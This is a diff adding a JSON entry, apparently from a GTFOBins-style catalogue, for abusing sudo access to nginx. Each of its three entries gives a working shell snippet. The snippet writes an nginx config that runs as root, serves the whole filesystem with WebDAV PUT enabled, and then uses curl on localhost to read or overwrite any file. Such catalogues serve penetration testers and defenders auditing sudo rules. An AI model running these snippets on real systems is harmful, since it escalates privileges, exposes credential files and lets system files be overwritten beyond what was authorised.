@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "description": "This will start a nginx webserver on the specified port. This will provide read/write access to all files on the system. The file path must be absolute.",
+        "code": "PORT=1337\nLFILE=file_to_read\nTFC=$(mktemp)\ncat > $TFC << EOF\nuser root;\nevents {\n  worker_connections 1024;\n}\nhttp {\n  server {\n    listen $PORT;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nEOF\nsudo nginx -c $TFC\ncurl -s http://localhost:$PORT$LFILE\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "This will start a nginx webserver on the specified port. This will provide read/write access to all files on the system. The file path must be absolute.",
+        "code": "PORT=1337\nLFILE=file_to_read\nTFC=$(mktemp)\ncat > $TFC << EOF\nuser root;\nevents {\n  worker_connections 1024;\n}\nhttp {\n  server {\n    listen $PORT;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nEOF\nsudo nginx -c $TFC\ncurl -s http://localhost:$PORT$LFILE\n"
+      }
+    ],
+    "file-write": [
+      {
+        "description": "This will start a nginx webserver on the specified port. This will provide read/write access to all files on the system. The file path must be absolute.",
+        "code": "PORT=1337\nLFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\nTFC=$(mktemp)\ncat > $TFC << EOF\nuser root;\nevents {\n  worker_connections 1024;\n}\nhttp {\n  server {\n    listen $PORT;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nEOF\nsudo nginx -c $TFC\ncurl -X PUT http://localhost:$PORT$LFILE -d @$TF\n"
+      }
+    ]
+  }
+}
